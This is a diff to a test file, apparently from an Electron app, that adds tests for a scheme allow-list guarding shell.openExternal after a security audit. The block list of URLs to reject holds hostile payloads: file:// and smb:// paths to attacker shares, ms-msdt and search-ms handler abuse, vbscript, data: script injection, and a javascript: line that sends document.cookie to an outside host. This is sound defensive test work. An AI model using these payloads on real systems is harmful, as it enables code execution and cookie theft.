@@ -3,6 +3,8 @@ import {
   needsBrowserProbe,
   hasLinuxBrowserHandler,
   resolveExternalOpenNotice,
+  isAllowedExternalUrl,
+  ALLOWED_EXTERNAL_SCHEMES,
   LINUX_BROWSER_BINARIES,
 } from '@vibisual/shared';
 
@@ -111,5 +113,50 @@ describe('LINUX_BROWSER_BINARIES — xdg-open 의 generic 탐색 목록', () => 
     expect(LINUX_BROWSER_BINARIES).toContain('firefox');
     expect(LINUX_BROWSER_BINARIES).toContain('google-chrome');
     expect(new Set(LINUX_BROWSER_BINARIES).size).toBe(LINUX_BROWSER_BINARIES.length);
+  });
+});
+
+/**
+ * §보안 감사 2026-09-09 — `shell.openExternal` 스킴 허용 목록.
+ *
+ * 그 함수는 브라우저를 여는 함수가 아니라 **OS 프로토콜 핸들러를 그대로 부르는** 함수다.
+ * 이 길로 들어오는 주소는 우리가 만들지 않는다 — 에이전트가 흘린 마크다운 링크, 훅이 등록한
+ * 카드, 내부 앱 화면의 `window.open` 이 전부 한 곳(`openExternalWithNotice`)으로 모인다.
+ * 즉 이 PC 안의 다른 프로그램이 쓴 문자열이 그대로 핸들러 인자가 되던 자리다.
+ */
+describe('isAllowedExternalUrl — 바깥으로 넘겨도 되는 주소인가', () => {
+  it('웹·메일 주소만 통과한다', () => {
+    expect(isAllowedExternalUrl('https://vibisual.dev/docs')).toBe(true);
+    expect(isAllowedExternalUrl('http://127.0.0.1:5173/')).toBe(true);
+    expect(isAllowedExternalUrl('mailto:hi@example.com')).toBe(true);
+    // 스킴 대문자도 같은 스킴이다.
+    expect(isAllowedExternalUrl('HTTPS://vibisual.dev')).toBe(true);
+  });
+
+  it('로컬 프로그램을 여는 스킴은 전부 막는다', () => {
+    for (const url of [
+      'file:///C:/Windows/System32/calc.exe',
+      'file://attacker-share/payload/setup.exe',
+      'ms-msdt:/id PCWDiagnostic',
+      'search-ms:query=passwords&crumb=location:\\\\attacker\\share',
+      'vbscript:msgbox(1)',
+      'javascript:fetch("http://x/"+document.cookie)',
+      'data:text/html,<script>alert(1)</script>',
+      'vscode://file/C:/secret',
+      'shell:startup',
+      'smb://attacker/share',
+    ]) {
+      expect(isAllowedExternalUrl(url), url).toBe(false);
+    }
+  });
+
+  it('절대 주소로 파싱되지 않는 값도 막는다 — 바깥에 넘길 것이 아니다', () => {
+    for (const url of ['', '   ', '//evil.example', '/api/agent-config', 'not a url']) {
+      expect(isAllowedExternalUrl(url), JSON.stringify(url)).toBe(false);
+    }
+  });
+
+  it('허용 목록은 세 스킴뿐이다 — 조용히 늘어나면 이 테스트가 먼저 깨진다', () => {
+    expect([...ALLOWED_EXTERNAL_SCHEMES]).toEqual(['http:', 'https:', 'mailto:']);
   });
 });
